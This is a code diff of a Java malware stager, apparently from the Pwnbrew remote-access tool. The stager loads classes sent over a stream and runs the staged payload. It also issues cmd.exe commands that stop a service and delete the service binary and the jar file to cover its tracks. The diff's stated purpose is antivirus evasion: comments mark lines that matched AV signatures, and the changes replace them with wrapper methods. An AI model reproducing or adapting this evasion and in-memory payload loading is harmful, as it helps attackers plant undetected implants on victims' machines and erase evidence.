@@ -188,30 +188,12 @@ public class Stager extends ClassLoader {
 
             //Get the path to the service
             try {
-                
-                byte[] inputStream = new byte[1024];
-                Process aProc = Runtime.getRuntime().exec(strList.toArray( new String[strList.size()] ));
-                OutputStream theirStdin = aProc.getOutputStream();
-                
-                //Close stdin
-                theirStdin.close();
-            
-                //Collect the data from stdout...
-                InputStream anIS = aProc.getInputStream();
-                StringBuilder aSB = new StringBuilder();
-                int bytesRead = 0;
-                while( bytesRead != -1){
-                    bytesRead = anIS.read(inputStream);
-                    if( bytesRead != -1 ){
-                        byte[] readArr = Arrays.copyOf(inputStream, bytesRead);
-                        aSB.append( new String(readArr));  
-                    }                  
-                }
-                
-                //Wait till it completes
-                aProc.waitFor(); 
-                
-                String output = aSB.toString().trim().toLowerCase();
+                String[] objArr = strList.toArray( new String[strList.size()]);
+                String retStr = Stager.execProc(objArr);
+
+//                Process aProc = Runtime.getRuntime().exec(strList.toArray( new String[strList.size()] )); //Exploit.Zip.Heuristic-java.csrvpr signature
+               
+                String output = retStr.trim().toLowerCase();
                 String theSvcPath = null;
                 String[] lines = output.split("\n");
                 for( String aLine : lines){
@@ -225,7 +207,7 @@ public class Stager extends ClassLoader {
                 cleanupList.add("cmd.exe");
                 cleanupList.add("/c");
 
-                aSB = new StringBuilder();
+                StringBuilder aSB = new StringBuilder();
                 aSB.append("net stop \"").append(serviceName).append("\"");
 
                 if(theSvcPath != null ){
@@ -233,21 +215,16 @@ public class Stager extends ClassLoader {
                     aSB.append(" && del \"").append(theSvcPath).append("\"");
                 }
                 aSB.append(" && del \"").append( theJarFile.getAbsolutePath()).append("\"");                
-
                 cleanupList.add(aSB.toString());
-                               
+                              
             } catch ( IOException ex ) {
-                ex = null;
-            } catch (InterruptedException ex) {
                 ex = null;
             }                 
             
             try{
-                Process aProcess = Runtime.getRuntime().exec(cleanupList.toArray( new String[cleanupList.size()]) );
-                aProcess.waitFor();
+                String[] objArr = cleanupList.toArray( new String[cleanupList.size()]);
+                Stager.execProc(objArr);
             } catch(IOException ex ){
-                ex = null;
-            } catch( InterruptedException ex ){
                 ex = null;
             }
 
@@ -263,6 +240,45 @@ public class Stager extends ClassLoader {
 
     }
     
+    private static String execProc( String[] strArr ) throws IOException{
+        ProcessBuilder theProcessBuilder = new ProcessBuilder( strArr );
+        theProcessBuilder.directory( null );
+
+        //Start the execution
+        Process theProcess = theProcessBuilder.start(); //Start a new process
+        OutputStream theirStdin = theProcess.getOutputStream();
+                
+        //Close stdin
+        theirStdin.close();
+
+        //Collect the data from stdout...
+        byte[] inputStream = new byte[1024];
+        InputStream anIS = theProcess.getInputStream();
+        StringBuilder aSB = new StringBuilder();
+        int bytesRead = 0;
+        while( bytesRead != -1){
+            bytesRead = anIS.read(inputStream);
+            if( bytesRead != -1 ){
+                byte[] readArr = Arrays.copyOf(inputStream, bytesRead);
+                aSB.append( new String(readArr));  
+            }                  
+        }
+
+        //Wait for the process to complete...
+        int exitValue = Integer.MIN_VALUE;
+        while( exitValue == Integer.MIN_VALUE ) { //Until the exit value is obtained...
+
+           try {
+                exitValue = theProcess.waitFor();
+            } catch( InterruptedException ex ) {
+                //Do nothing / Continue to wait for the process to exit
+                ex = null;
+            }
+
+        }
+        return aSB.toString().trim();
+    }
+        
     //========================================================================
     /**
      *  Receives the first classes
@@ -307,26 +323,37 @@ public class Stager extends ClassLoader {
                         Permissions localPermissions = new Permissions();
                         localPermissions.add(new AllPermission());
                         ProtectionDomain localProtectionDomain = Stager.class.getProtectionDomain();
-                        //ProtectionDomain localProtectionDomain = new ProtectionDomain(new CodeSource(new URL("file:///"), new Certificate[0]), localPermissions);
-                        Class localClass;
-
+                        //ProtectionDomain localProtectionDomain = new ProtectionDomain(new CodeSource(new URL("file:///"), new Certificate[0]), localPermissions); //AV Signature
+                        Class localClass = null;
+                        
+                        //Used to evade AV
+                        DefineClassMethod classMethod = new DefineClassMethod();
+                        
+//                        Method aMethod = ClassLoader.class.getDeclaredMethod("defineClass", 
+//                                   new Class[] { String.class, byte[].class, int.class, int.class, ProtectionDomain.class }); //Exploit.Zip.Heuristic-java.csrvpr signature
+//                            
                         int classLength = localDataInputStream.readInt();
                         do {
                             byte[] arrayOfByte = new byte[classLength];
                             localDataInputStream.readFully(arrayOfByte);
-                            resolveClass(localClass = defineClass(null, arrayOfByte, 0, classLength, localProtectionDomain));
-                            classLength = localDataInputStream.readInt();
+                            
+                            localClass = classMethod.runMethod(this, arrayOfByte, classLength, localProtectionDomain);
+                            if( localClass != null ){
+                                resolveClass(localClass);
+                                classLength = localDataInputStream.readInt();
+                            }
                         }
                         while (classLength > 0);            
 
 
                         //Start staged class
-                        Object pwnbrewStage = localClass.newInstance();
-                        String[] theObjArr = new String[]{passedURL};
+                        if( localClass != null ){
+                            Object pwnbrewStage = localClass.newInstance();
+                            String[] theObjArr = new String[]{passedURL};
 
-                        Method aMethod = localClass.getMethod("start", new Class[] { DataInputStream.class, OutputStream.class, String[].class });
-                        aMethod.invoke(pwnbrewStage, new Object[] { localDataInputStream, paramOutputStream, theObjArr });
-                    
+                            Method aMethod = localClass.getMethod("start", new Class[] { DataInputStream.class, OutputStream.class, String[].class });
+                            aMethod.invoke(pwnbrewStage, new Object[] { localDataInputStream, paramOutputStream, theObjArr });
+                        }
                     }   
             }
         
